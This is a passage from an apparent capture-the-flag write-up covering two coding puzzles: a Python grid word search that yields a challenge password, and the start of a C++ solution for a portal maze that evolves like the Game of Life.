<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> UL</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> UL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> DR</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> DR</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#DBD7CAEE"> d </span><span style="color:#CB7676">==</span><span style="color:#C99076"> DL</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#C99076"> DL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pref </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> vis</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> poss</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> not_changed</span><span style="color:#666666">):</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#4D9375">    else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        assert</span><span style="color:#4D9375"> False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    vis</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> False</span></span>
<span class="line"><span style="color:#DBD7CAEE">    poss</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#4D9375"> False</span></span>
<span class="line"></span></code></pre>
<p>Finally for every cell we call the dfs in every direction:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">)):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">])):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> UP</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> DOWN</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> RIGHT</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> LEFT</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> UR</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> UL</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> DL</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        search</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#C99076"> DR</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">,</span><span style="color:#666666"> [[</span><span style="color:#4D9375">False</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]))]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">grid</span><span style="color:#666666">))],</span><span style="color:#666666"> [],</span><span style="color:#4D9375"> True</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>( I’m Sorry )</p>
<p>And print the password:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i </span><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> j</span><span style="color:#666666">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> grid</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">replace</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">))</span></span>
<span class="line"></span></code></pre>
<p>Password:
<code>FZRQEACJLWFSEVERALYYNVRRFVCPUWTMISZNLERUTXIMVIJHNXEDETXWURRUEREDOPHPHMMDKWYOSMRELLAMSYHBUZGHGVVEFZRRNLBTJSAMFMOCPYEANGDBBTCWIETXBUQPZOJOAXAEDRSINZXBSQMDBEIZOIUAOAPRTRAVELEDOWLCLWJEIOLVHLHGOCWOZCDQYLDTCORWQECINQXIEHFIFWRKDLEKATSIMLKRNFZFBTJEKJYSJPENUZVENSKXLSAJZCAZWSBWCFLCCEJZLAFMSNTYAUGBLFRWFTDQGASDWVEWJYQZLAENMNXJEYIESIKSNOOKDLXTNHRHCASCBYVNTORIUFLAIPRHYOOSTPJPEWOGPGFKNEGULMRPRBQAISLBTAUSINPRKCKMMPFFKCRWJNATYPNTNKTCEYAOMKORNGSMEGXAEILDEDIBLESSEDBOGATSPESLKBTJENORMOUSZOMAMEXBBTEUNCMRUUPSRROSNSTFOQHNDNNYMRSXBHEVDABANDONEDREMEMBEREVAFUECPAGAATGMUPBMYSXLKTSPVRIDEBHAKODTRPYEHMOZPDHRMPTTEFUFLEHTDRSRBVOCJSINORPYUAVFDCNIRQYONHDYCXOKNOBIUOWEHIPIGGEZCHXZZBHTATEGFZUTIEMKTIZRNTBEEQMZSCUTXERKAVAQCBHAMIVSKXIQGWLCKUTNFUXUWAZQQKGOSDEGWECPOGKBVQUBKMOJNVDEHSINRUFMHXFJVSBHPXZRTDGUZJICWBQAZYMMKNLSDCHYZXS</code></p>
<h3 id="coding-200">Coding 200</h3>
<h4 id="overview-1">Overview</h4>
<p>This challenge has not much to say, all the rules are well explained in the <code>README.md</code> file, so I’m not going to explain them in details.</p>
<p>Basically we have to find all the possible paths between two points in a maze of blackholes that evolves similarly to the <a href="https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life">game of life</a>. In addition to that, we have portals that teleports you across the map.</p>
<h4 id="solution-1">Solution</h4>
<p>Afraid of performances (and pushed by a strange gut feeling) I started writing the code in C++ (and never regretted it, even if it was probably not necessary).</p>
<p>The idea is to precompute all the states until a maximum depth and then do dfs to find all the paths (using a better search algorithm is useless, since we have to find all the best paths and not just one of the best).</p>
<p>To store everything we need a lot of vectors:</p>
<ul>
<li><code>grid</code>: for the initial grid</li>
<li><code>time_grid</code>: for all the states of the grid</li>
<li><code>portals</code>: for the portals</li>
<li><code>valid_portals</code>: to check if a portal is valid at a particular step</li>
<li><code>(start|end)_(x|y)</code>: for the starting and ending point</li>
</ul>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line"><span style="color:#666666"> #</span><span style="color:#4D9375">define</span><span style="color:#80A665"> MAX</span><span style="color:#4C9A91"> 1000</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> W </span><span style="color:#666666">=</span><span style="color:#BD976A"> grid</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">].</span><span style="color:#80A665">size</span><span style="color:#666666">(),</span><span style="color:#DBD7CAEE"> H </span><span style="color:#666666">=</span><span style="color:#BD976A"> grid</span><span style="color:#666666">.</span><span style="color:#80A665">size</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">pair </span><span style="color:#CB7676">&#x3C;int</span><span style="color:#666666">,</span><span style="color:#CB7676"> int>>></span><span style="color:#80A665"> portals</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">H</span><span style="color:#666666">,</span><span style="color:#80A665"> vector</span><span style="color:#666666"> &#x3C;</span><span style="color:#5DA994">pair</span><span style="color:#666666"> &#x3C;</span><span style="color:#CB7676">int</span><span style="color:#666666">,</span><span style="color:#CB7676"> int</span><span style="color:#666666">>></span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">W</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> {</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#DBD7CAEE">}</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;bool>>></span><span style="color:#80A665"> valid_portals</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">MAX</span><span style="color:#666666">,</span><span style="color:#80A665"> vector</span><span style="color:#666666"> &#x3C;</span><span style="color:#5DA994">vector</span><span style="color:#666666"> &#x3C;</span><span style="color:#CB7676">bool</span><span style="color:#666666">>></span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">H</span><span style="color:#666666">,</span><span style="color:#80A665"> vector</span><span style="color:#666666"> &#x3C;</span><span style="color:#CB7676">bool</span><span style="color:#666666">></span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">W</span><span style="color:#666666">,</span><span style="color:#4D9375"> false</span><span style="color:#666666">)));</span></span>
<span class="line"><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">string</span><span style="color:#CB7676">>></span><span style="color:#DBD7CAEE"> time_grid</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> start_x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> start_y</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> end_x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> end_y</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>For the dfs:</p>
<ul>
<li><code>on_portal</code>: if this portal has already been used</li>
<li><code>visited</code>: if we already visited a specific cell</li>
</ul>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line"><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;bool>></span><span style="color:#80A665"> on_portal</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">H</span><span style="color:#666666">,</span><span style="color:#80A665"> vector</span><span style="color:#666666"> &#x3C;</span><span style="color:#CB7676">bool</span><span style="color:#666666">></span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">W</span><span style="color:#666666">,</span><span style="color:#4D9375"> false</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;bool>></span><span style="color:#80A665"> visited</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">H</span><span style="color:#666666">,</span><span style="color:#80A665"> vector</span><span style="color:#666666"> &#x3C;</span><span style="color:#CB7676">bool</span><span style="color:#666666">></span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">W</span><span style="color:#666666">,</span><span style="color:#4D9375"> false</span><span style="color:#666666">));</span></span>
<span class="line"></span></code></pre>
<p>And to store the answer:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> best_time </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> MAX</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> best_portals </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> n_sols </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">vector </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">string</span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> paths</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>First, we save all the initial information (portals and start / end) and we clear the map from everything that is not a blackhole (this is important in order to calculate the blackholes state at every timestep)</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> y </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> H</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> y</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> x </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> W</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> x</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">                start_y </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> start_x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#BD976A">grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">                end_y </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> end_x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#666666"> (</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> &#x3C;=</span><span style="color:#BD976A"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#BD976A"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#CB7676"> &#x3C;=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">z</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> yy </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> yy </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> H</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> yy</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                    for</span><span style="color:#666666"> (</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> xx </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> xx </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> W</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> xx</span><span style="color:#CB7676">++</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">                        if</span><span style="color:#666666"> ((</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">!=</span><span style="color:#DBD7CAEE"> yy </span><span style="color:#CB7676">||</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">!=</span><span style="color:#DBD7CAEE"> xx</span><span style="color:#666666">)</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#BD976A"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">yy</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">xx</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#BD976A"> grid</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">])</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                            portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#666666"> {</span><span style="color:#DBD7CAEE">yy</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> xx</span><span style="color:#666666">};</span></span>
